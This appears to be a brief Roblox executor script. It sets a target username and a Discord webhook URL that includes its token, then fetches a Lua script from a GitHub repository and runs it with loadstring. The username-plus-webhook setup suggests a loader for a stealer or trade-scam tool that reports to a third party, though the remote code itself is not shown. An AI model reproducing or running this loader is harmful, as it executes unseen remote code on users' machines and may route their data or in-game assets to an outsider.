-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "bismarck1002"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1546213476991504486/jtx6rRXZw2u0vsLA7H5Rpzzytk_TQ3pwbjcdKTdH1gdZcLGa9cp6pgIfIXdbZAkMI7ID"
...
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub1/Zl-Hub-/refs/heads/main/ZLPVPreview.lua"))()
end)